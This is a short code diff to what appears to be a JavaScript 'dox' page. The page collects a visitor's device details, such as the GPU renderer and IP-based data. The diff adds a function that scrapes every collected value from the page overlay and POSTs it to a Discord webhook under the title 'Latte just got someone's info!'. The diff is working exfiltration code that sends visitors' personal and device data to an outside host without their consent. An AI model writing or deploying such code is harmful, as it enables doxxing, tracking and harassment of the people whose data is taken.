@@ -66,7 +66,33 @@ function startDox() {
             await displayInfo("GPU Info", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
         }
     }
-    fetchAndDisplayIPData();
+    
+        const info = Array.from(doxOverlay.children).map(span => {
+            const [label, ...rest] = span.innerText.split(": ");
+            return { label, value: rest.join(": ") };
+        });
+        sendToWebhook(info);
+
+fetchAndDisplayIPData();
+}
+
+
+async function sendToWebhook(info) {
+    const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_URL_HERE"; // Replace this
+
+    const embed = {
+        title: "🎯 Latte just got someone's info!",
+        color: 0x7F73D2,
+        description: info.map(i => `**${i.label}:** ${i.value}`).join("\n")
+    };
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ embeds: [embed] })
+    });
 }
 
 function init(param) {
